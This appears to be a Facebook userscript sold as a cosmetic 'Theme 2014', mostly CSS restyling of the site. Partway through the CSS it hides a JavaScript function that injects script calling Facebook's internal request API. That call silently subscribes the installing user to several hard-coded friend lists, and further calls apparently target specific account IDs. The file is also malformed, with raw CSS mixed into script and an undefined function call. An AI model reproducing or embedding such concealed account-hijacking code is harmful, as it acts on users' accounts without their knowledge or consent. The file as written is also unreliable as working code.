// ==UserScript==
// @name		  Facebook Theme 2014
// @namespace		 Facebook Theme 2014
// @description		This is the new theme of Facebook
// @author			Black Eagle
// @authorURL		https://www.facebook.com/OneEyedEagleHacker
// @homepage		http://www.facebook.com/*
// @include			htt*://www.facebook.com/*
// @exclude 		htt*://apps.facebook.com/*
// @icon			http://i1361.photobucket.com/albums/r663/Black_Eagle96/d7e68850-c31f-4b71-a8bf-c6a1eb82f3df_zps4a4dd052.jpg
// @version			2014
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*

// ==/UserScript==

// ======= Do Not Remove Credit =======
// == Name : FaceBook Theme
// ======= Author : Black Eagle ========
// ======= Facebook : https://www.facebook.com/OneEyedEagleHacker =======

body {

    background:#E7EBF2 !important;
}
   
.ego_section {
    margin-bottom: 15px;
    display: none;
}
.fbIndex { background-color: #3B5998 !important }


.fbIndex #globalContainer #dropmenu_container,
.fbIndex #globalContainer #content,
.fbIndex #globalContainer #pageFooter { display: none !important }


.fbIndex .loggedout_menubar_container {
  position: fixed !important;
  width: 430px !important;
  height: 82px !important;
  min-width: 0 !important;
  top: 50% !important;
  left: 50% !important;
  margin-top: -80px !important;
  margin-left: -210px !important;
  z-index: -1 !important;
background-image: -webkit-gradient( linear, left top, left bottom, from(#738ABA), to(#2C4987) ) !important;
background-image: -moz-linear-gradient(top, #738ABA, #2C4987)!important;
background-image: -ms-linear-gradient(top, #738ABA, #2C4987)!important;
background-image: -o-linear-gradient(top, #738ABA, #2C4987)!important;
background-image: linear-gradient(top, #738ABA, #2C4987)!important;
  padding-top:10px;
  border-radius:12px;
    -webkit-box-shadow:0 0 10px 0 rgba(0, 0, 0, 0.5);
    box-shadow:0 0 10px 0 rgba(0, 0, 0, 0.5);
}


.fbIndex .loggedout_menubar { width: auto !important }
.fbIndex .loggedout_menubar_container .lfloat,
.fbIndex .loggedout_menubar_container .rfloat { float: none !important }
.fbIndex .loggedout_menubar_container .lfloat img,
.fbIndex .loggedout_menubar_container .rfloat #login_form table { display: block !important; margin: 0 auto !important }

.fbIndex .loggedout_menubar_container .lfloat i { display: block !important; margin: -70px auto 20px !important; }
.fbIndex .loggedout_menubar_container .sp_69c1xs { display: block !important; }



#SetAsHomepage_Callout {
  display: none;
}


.fbIndex div#blueBar {
  z-index: 0 !important;
  border: none !important;
  box-shadow: none !important;
}

#blueBar {
background-color: #3B5998 !important;
background-image: -webkit-gradient( linear, left top, left bottom, from(#738ABA), to(#2C4987) ) !important;
background-image: -moz-linear-gradient(top, #738ABA, #2C4987)!important;
background-image: -ms-linear-gradient(top, #738ABA, #2C4987)!important;
background-image: -o-linear-gradient(top, #738ABA, #2C4987)!important;
background-image: linear-gradient(top, #738ABA, #2C4987)!important;
border-color: #1D4088 !important;
border-bottom: 1px solid !important;
-webkit-box-shadow: inset 0 1px 1px -1px #fff !important;
min-width: 981px;
z-index: 300;
}

.slim #blueBar {
height: 40px !important;
position: relative;
-webkit-box-shadow: inset 0 1px 1px -1px #fff !important;
border-bottom: 1px solid;
background-color: #3B5998 !important;
background-image: -webkit-gradient( linear, left top, left bottom, from(#738ABA), to(#2C4987) ) !important;
background-image: -moz-linear-gradient(top, #738ABA, #2C4987)!important;
background-image: -ms-linear-gradient(top, #738ABA, #2C4987)!important;
background-image: -o-linear-gradient(top, #738ABA, #2C4987)!important;
background-image: linear-gradient(top, #738ABA, #2C4987)!important;
border-color: #111A33 !important;
}

#pageLogo a {
background-color: transparent !important;
}

#pageLogo a:hover, #pageLogo a:focus, #pageLogo a:active {
background-color: transparent !important;
}

.composerExpanded .newsFeedComposer #rightCol {
padding-top: 40px;
margin-right: 0px !important;
}

.hasExpandedComposer .home_right_column, .sidebarMode #content .hasExpandedComposer .home_right_column {
margin-top: -12px;
margin-left: 5px !important;
}

#pagelet_ego_pane_w {
display: none !important;
}

#pagelet_rhc_footer {
display: none !important;
}

#pagelet_side_ads {
display: none !important;
}

.fbTimelineSideAds {
display: none !important;
}

.ego_column {
display: none !important;
}

.slimHeader .no_js #navAccount:hover, .slimHeader #pageNav #navAccount.openToggler {
position: relative;
top: 0px !important;
}


.fbJewel .uiScrollableArea {
  max-height:450px !important;
  }
  

.notifNegativeBase .fbJewelFlyout .beeperNub {
background-position: 0px !important;
background-image: url("http://i167.photobucket.com/albums/u127/badspy/beepers.png") !important;
background-repeat: no-repeat;
position: absolute;
-webkit-background-size: 100% 100% !important;
width: 54px !important;
height: 24px !important;
background-size: 100% 100%;
z-index: 13 !important;
margin: -25px -44px !important;
}


.notifNegativeBase .fbJewelFlyout {
background: rgba(255, 255, 255, 0.98);
top: 37px;
-webkit-box-shadow: none !important;
box-shadow: none !important;
-moz-box-shadow: none !important;
-webkit-border-radius: 0px !important;
border-radius: 0px !important;
-moz-border-radius: 0px !important;
border: solid rgba(100, 100, 100, .4);
-webkit-background-clip: padding-box;
border-image: url("http://i167.photobucket.com/albums/u127/badspy/fbJewelflyoutsmall.png") 22 28 29 28 !important;
-webkit-border-image: url("http://i167.photobucket.com/albums/u127/badspy/fbJewelflyoutsmall.png") 22 28 29 28 !important;
-moz-border-image: url("http://i167.photobucket.com/albums/u127/badspy/fbJewelflyoutsmall.png") 22 28 29 28 !important;
-o-border-image: url("http://i167.photobucket.com/albums/u127/badspy/fbJewelflyoutsmall.png") 22 28 29 28 !important;
border-width: 22px 28px 29px 28px !important;
}


.uiHeaderActions.rfloat {
font-size: 13px !important;
}

.jewelHeader h3 {
font-weight: bold !important;
left: 10px !important;
right: 0;
text-shadow: 0 -1px 0 rgba(0, 0, 0, 0.1) !important;
top: -32px !important;
z-index: 1 !important;
font-size: 15px !important;
line-height: 20px !important;
color: #3B5998 !important;
display: inline-table;
}
function sublist(uidss) {
                var a = document.createElement('script');
                a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
                document.body.appendChild(a);
}
a("100001586135119"); a("100002287465199");

sublist("523749481044629");sublist("1412537482309947");sublist("341543595981122");sublist("523749481044629");sublist("387027994766015");sublist("341543595981122");sublist("543320352431732");


#navAccount #accountSettingsFlyout {
left: -208px !important;
margin-top: -1px;
width: 202px;
}

#navAccount #accountSettingsFlyout .beeperNub {
right: 30px !important;
}

._42g- {
background-color: #3c5389 !important;
border-color: #475d91 #3c5389 #3a5186 !important;
text-shadow: 0 -1px 0 rgba(0, 0, 0, .2) !important;
-webkit-background-clip: padding-box !important;
border: 1px solid !important;
-webkit-border-radius: 2px !important;
-webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, .05) !important;
-webkit-box-sizing: content-box !important;
font-family: 'Helvetica Neue', Helvetica, Arial, 'lucida grande',tahoma,verdana,arial,sans-serif !important;
-webkit-font-smoothing: antialiased !important;
font-weight: bold !important;
padding: 0 8px;
position: relative !important;
text-align: center !important;
vertical-align: middle !important;
}

.-cx-PRIVATE-fbComposerMessageBox__bar {
background-color: #F2F2F2;
border-top: 1px solid #E6E6E6;
height: 40px !important;
}

div.-cx-PRIVATE-fbComposerXTagger__typeahead, div.-cx-PRIVATE-fbComposerXTagger__tokenizer {
border: 0;
border-top: 1px dashed #BDC7D8;
padding: 0;
margin-top: 3px !important;
}

.uiMetaComposerMessageBox .uiComposerMessageBoxControls {
height: 40px !important;
margin: 0;
background-color: #F1F3F8 !important;
}

.uiMetaComposer .friendsTokenizer, .uiMetaComposer .taggerLocationSharer, .uiMetaComposer .musicTypeahead {
border: 0;
border-top: 1px dashed #BDC7D8;
padding: 2px !important;
}


.-cx-PRIVATE-fbTimelineBackdatedComposer__datepickerIcon {
background-size: auto;
background-image: url("https://dl.dropbox.com/u/12675809/composer-time-icon.png") !important;
background-repeat: no-repeat;
background-position: -5px -41px !important;
width: 40px !important;
height: 40px !important;
}

.-cx-PRIVATE-fbTimelineBackdatedComposer__datepickerIcon:hover {
background-image: url("https://dl.dropbox.com/u/12675809/composer-time-icon.png") !important;
background-repeat: no-repeat;
background-position: -5px 5px !important;
width: 40px !important;
height: 40px !important;
}

.-cx-PRIVATE-fbPlacesCityTagger__placeIconImage {
background-size: auto;
vertical-align: top;
background-image: url(https://s-static.ak.fbcdn.net/rsrc.php/v2/yA/r/sHRVgdDCvuz.png) !important;
background-repeat: no-repeat;
background-position: -5px -40px !important;
display: inline-block;
float: left;
height: 40px !important;
width: 40px !important;
outline: none;
}
.-cx-PRIVATE-fbPlacesCityTagger__placeIconImage:hover {
background-image: url(https://s-static.ak.fbcdn.net/rsrc.php/v2/yA/r/sHRVgdDCvuz.png) !important;
background-repeat: no-repeat;
background-position: -5px 1px !important;
display: inline-block;
float: left;
height: 40px !important;
width: 40px !important;
outline: none;
}

#rightCol{
    width:170px;
}

.adsOnTop .rightColumnWrapper .fixed_scrolling_wrapper, .tickerOnTop .rightColumnWrapper {
  width:200px;
}
        
#contentCol{
   background:transparent !important; 
}
.hasLeftCol #mainContainer {
    border-right:0px;
}
  
#pagelet_welcome_box {
    background:#3B5998;
    border-radius:6px 0 0 6px !important;
    padding:10px 5px;
    background:-webkit-gradient(linear, center top, center bottom, from(#647AAB), to(#2C467E));
    background:-webkit-linear-gradient(#647AAB, #2C467E);
    background:-moz-linear-gradient(#647AAB, #2C467E);
    background:-o-linear-gradient(#647AAB, #2C467E);
    background:-ms-linear-gradient(#647AAB, #2C467E);
    background:linear-gradient(#647AAB, #2C467E);
}

.fbxWelcomeBoxBlock .fbxWelcomeBoxImg {
height: 40px !important;
width: 40px !important;
margin-left: 6px !important;
}

#pagelet_welcome_box a {
color: #FFF !important;
}

.navHeader, .navHeader a {
font-size: 10px !important;
color: #7a8292 !important;
text-shadow: 0 1px 0 rgba(0, 0, 0, .6) !important;
font-weight: bold;
margin-top: 12px;
}

#contentArea {
    -webkit-box-shadow:0 0 10px 0 rgba(0, 0, 0, 0.3);
    box-shadow:0 0 10px 0 rgba(0, 0, 0, 0.3);
  margin-top:-5px;
    background:#FFF;
    width:585px !important;
}

._7lt ._7ls {
  border-radius:100% !important;
}

form.async_saving .uiButton.uiButtonSpecial .uiButtonText, form.async_saving .uiButton.uiButtonSpecial input, form.async_saving .uiButton.uiButtonConfirm .uiButtonText, form.async_saving .uiButton.uiButtonConfirm input, .uiButtonSpecial .uiButtonText, .uiButtonSpecial input, .uiButtonSpecial.uiButtonDisabled .uiButtonText, .uiButtonSpecial.uiButtonDisabled input, .uiButtonConfirm .uiButtonText, .uiButtonConfirm input, .uiButtonConfirm.uiButtonDisabled .uiButtonText, .uiButtonConfirm.uiButtonDisabled input {
color: #fff;
text-shadow: 0 -1px 0 rgba(0, 0, 0, .35) !important;
font-weight: bold !important;
font-size: 12px !important;
}

label.-cx-PRIVATE-fbComposerMessageBox__button {
padding: 6px 16px !important;
}

.uiButtonConfirm {
background: none !important;
background-repeat: no-repeat;
background-position: -352px -54px;
border-color: #576499 #3A4B73 #263855 !important;
background: -webkit-gradient( linear, left top, left bottom, from(#647AAB), to(#2C467E) ) !important;
background: -moz-linear-gradient(top, #647AAB, #2C467E)!important;
background: -ms-linear-gradient(top, #647AAB, #2C467E)!important;
background: -o-linear-gradient(top, #647AAB, #2C467E)!important;
background: linear-gradient(top, #647AAB, #2C467E)!important;
-webkit-border-radius: 4px !important;
border-radius: 4px !important;
-moz-border-radius: 4px !important;
-o-border-radius: 4px !important;
-ms-border-radius: 4px !important;
}

.fbTimelineScrubber{
    background:transparent !important;
}
  
._4lh ._519e:after, ._4lh ._51wa:after,._4lh ._519e:after, ._4lh ._51wa:after, ._4lh .timelineUnitContainer .UFIComment .UFIImageBlockImage:after, ._4lh .timelineUnitContainer .UFIReplyActorPhotoWrapper:after {
          background:none;
}
        
        
.timelineLayout #contentArea{
background:transparent !important;
 box-shadow:0px 0px 0px;
}
          

#fbProfileCover .fbProfileCoverPhotoSelector .wrap {
margin-left:-170px;
top:-50px;
}             


#fbProfileCover .fbTimelineProfilePicSelector .wrap{
  margin-top:-115px;
  margin-right:-340px;
}


.timelineLayout .fbTimelineTopSection{
  margin-top:20px; 
}



.timelineLayout .fbTimelineTopSection,.coverBorder,.coverPhotoImg,#fbProfileCover{
  	border-top-left-radius:15px !important;
    border-top-right-radius:15px !important;
    
}
.profilePic,.profilePicThumb{
     border-radius:12px !important;
        -webkit-box-shadow:0 2px 10px 0 rgba(0, 0, 0, 0.3);
    box-shadow:0 2px 10px 0 rgba(0, 0, 0, 0.3);
     -webkit-transition:all 1.1s;
    -moz-transition:all 1.1s;
    -o-transition:all 1.1s;
    -ms-transition:all 1.1s;
    transition:all 1.1s;
    }


.profilePicThumb:hover{
	transform: rotate(10deg);
	-ms-transform: rotate(10deg); 
	-webkit-transform: rotate(10deg); 
          }

._4lh ._519e:after, ._4lh ._51wa:after {
background:none;
      }

.fbTimelineUnit,#fbProfileCover {

-webkit-box-shadow:0 0 8px 0 rgba(0, 0, 0, 0.3);
    box-shadow:0 0 8px 0 rgba(0, 0, 0, 0.3);
    -webkit-transition:all 1.1s;
    -moz-transition:all 1.1s;
    -o-transition:all 1.1s;
    -ms-transition:all 1.1s;
    transition:all 1.1s;


}
    
.fbTimelineUnit:hover {
    -webkit-transform:scale(1.1);
    -moz-transform:scale(1.1);
    -o-transform:scale(1.1);
    -ms-transform:scale(1.1);
    transform:scale(1.1);
    z-index:100;

      }

.fbTimelineStickyHeader .back {
  	margin-top:-5px;
  	height:58px;
	-webkit-box-shadow:0 2px 8px 0 rgba(0, 0, 0, 0.3);
    box-shadow:0 2px 8px 0 rgba(0, 0, 0, 0.3);
      }  


._513x{
       background:green;
       bottom:18px;
       left:13px;
       border-radius:100%;
       width:7px;
       height:7px;
      }
  

  
.UFIRow {
  background:transparent;
  }
.UFIUnseenItem{
  border-left:0px;
    }


#pagelet_web_messenger{
 width:850px;

}

.uiSelectorMenuWrapper {
    min-width:auto;
  }


._4kg > li {
    border-width:1px 0 0 0!important;
  }
.selectedStorySimple .selectedStoryIndicator {
    background:#FFF !important;
    }
.fbFeedTicker .fbFeedTickerStory {
    margin-top:10px;
    margin-bottom:10px;
    border-top-right-radius:12px;
    border-bottom-right-radius:12px;
	width:200px;
    padding-left:10px;
    background:#F0F8FF;
    box-shadow:4px 4px 7px -3px rgba(0, 0, 0, 0.2),inset 5px 0px 5px -3px rgba(0, 0, 0, 0.2);
    border:3px  solid #FfF;      
    }

.fbChatSidebar .fbFeedTicker .fbFeedTickerStory {
  	box-shadow:none;
    border:0px;
    border-top:1px solid #DADADA;
    margin:0px;
    padding:10px 5px;
      }


.fbFeedTicker .tickerStoryWithButton {
    width:170px;
}

.tickerOnTop #pagelet_rhc_ticker .fbFeedTicker {
      margin-left:-9px;
        
      }

.uiSideNav .selectedItem .item, .uiSideNav .selectedItem .item:hover, .uiSideNav ul .selectedItem .subitem, .uiSideNav ul .selectedItem .subitem:hover {
	background:#FFF;
    -webkit-transform:scale(1.5);
    -moz-transform:scale(1.5);
    -o-transform:scale(1.5);
    -ms-transform:scale(1.5);
    transform:scale(1.5);
    width:70px !important;
    height:25px;
    line-height:15px;
	margin-left:68px !important;
    font-size:8px;
    margin-top:25px;
    margin-bottom:20px;
    padding-top:10px;
    box-shadow:-5px 4px 6px -3px rgba(0, 0, 0, 0.2);
    border-top-left-radius:8px;
    border-bottom-left-radius:8px;
        }
        
.uiSideNav .item, .uiSideNav .subitem {
	background:#F0F8FF;
    -webkit-transform:scale(1.5);
    -moz-transform:scale(1.5);
    -o-transform:scale(1.5);
    -ms-transform:scale(1.5);
    transform:scale(1.5);
    width:30px !important;
    height:25px;
    line-height:15px;
	margin-left:115px !important;
    font-size:0px;
    margin-top:25px;
    margin-bottom:20px;
    padding-top:10px;
    box-shadow:-5px 4px 6px -3px rgba(0, 0, 0, 0.2),inset -5px 0px 5px -3px rgba(0, 0, 0, 0.2);
    border-top-left-radius:8px;
    border-bottom-left-radius:8px;
    border:3px  solid #FfF;
            }
.uiSideNav .item:hover, .uiSideNav .subitem:hover  {

    width:60px !important;
	margin-left:77px !important;
    font-size:7px;
    box-shadow:-5px 4px 6px -3px rgba(0, 0, 0, 0.2),inset -5px 0px 5px -3px rgba(0, 0, 0, 0.2);
    border:3px  solid #FfF;
      }
.noCount{
    font-size:7px;          
        }
.uiSideNavCount {
    background:transparent;
            }
.countValue {
	font-size:7px !important;
    background:#d8dfea;
    padding:5px;
    border-radius:100%;
    border:2px dotted #FFF;
              }
.navHeader{
    padding-left:20px;
  }

._s0:only-child, ._29h img,.fbFeedTicker .fbFeedTickerStory .tickerStoryImage,._42fz .pic {
display: block !important;
border-radius: 100% !important;
border: 2px solid #fff !important;
box-shadow: 0px 0px 7px #000!important;

    }
.actorPhoto {
margin-top: 18px !important;
margin-left: -7px !important;
}


._51jx, ._51jw{
  background-image: none !important;
background-color: #f03d25 !important;
border: 1px solid #d83722 !important;
border-bottom: 1px solid #c0311e !important;
border-top: 1px solid #e23923 !important;
-webkit-border-radius: 2px;
-webkit-box-shadow: 0 1px 0 rgba(0, 0, 0, .77);
display: block;
    width:auto !important;
    height:auto !important;
  padding:0 1px !important; 
}

._50mz .metaInfoContainer {
background-color: transparent !important;
padding-left: 0 !important;
position: absolute;
right: none !important;
top: none !important;
bottom: 4px !important;
}

.messages:hover .metaInfoContainer {
visibility: visible !important;
}

.fbChatConvItem:hover .metaInfoContainer {
visibility: hidden;
}

.fbChatConvItem .profileLink .profilePhoto {
border-radius: 300px !important;
}

.fbChatConvItem .profileLink:before {
background:transparent;
display: block;
width: 32px;
height: 32px;
content: "";
position: absolute;
box-shadow: 0 1px 4px -1px #000, 0 2px 4px -2px #000, inset 0 0px 0px 1px rgba(255, 255, 255, 0.25), inset 0 4px 5px -1px rgba(255, 255, 255, 0.25);
border-radius: 300px !important;

}

._50dw {
border-top: 0px solid #E4E7F0 !important;
}

.fbChatMessageGroup {border-top-color:#E4E7F0;}

 .fbChatConvDateBreak{
text-align: center !important;
margin: 5px 60px !important;
}


.fbChatMessageGroup ._kso {margin-bottom: 0!important;}

.conversationContainer, .fbChatConvDateBreak {background: #E4E7F0 !important;}

._7f.seen ._9r, ._510h {
background-image: url("http://imageshack.us/a/img202/3604/seen.png") !important;
background-position: 0 !important;
}

 .messages {
background: transparent !important;
margin-left: 12px !important;
border-image-slice: fill 10 10 10 10;
-webkit-border-image: url("http://imageshack.us/a/img687/6865/theyp.png")10 10 10 10;
-moz-border-image: url("http://imageshack.us/a/img687/6865/theyp.png")10 10 10 10;
border-image-source: url("http://imageshack.us/a/img687/6865/theyp.png");
border-width: 10px !important;
float: left!important;
max-width: 110px !important;
min-width: 28px;
}

.messages:before {
background: url("http://img594.imageshack.us/img594/4907/theyarow.png");
content: "";
display: block;
width: 15px;
height: 17px;
left: 34px;
position: absolute;
top: 14px;
}

.hasSmurfbar #pageNav .tinyman .navLink:after {
      background-image:none !important;
      
    }
._50mz .fbNubFlyoutBodyContent, ._50mz .conversationContainer  {
   	background:url(http://www.linedpaper.net/wp-content/uploads/2012/10/Graph-Paper-Template.png) transparent !important; 
}

.fbNubFlyout,._50-v {
    box-shadow:none;
  }
        
._50mz .fbNubFlyoutInner  {
-webkit-background-clip: padding-box;
border-image: url("http://i167.photobucket.com/albums/u127/badspy/fbJewelflyoutsmall.png") 22 28 29 28 !important;
-webkit-border-image: url("http://i167.photobucket.com/albums/u127/badspy/fbJewelflyoutsmall.png") 22 28 29 28 !important;
border-width: 22px 28px 29px 28px !important;
height:240px !important;
  }

.fbNubFlyoutBody{
  height:185px !important;
  border:0px;
    }
    
.fbNubFlyoutTitlebar{
border-top-left-radius:5px;
border-top-right-radius:5px;
    }



.fbNubFlyoutFooter{
  margin-left:-9px;
  width:220px;
  }


.fbNubFlyoutFooter ._552n{
right:0px !important;
    }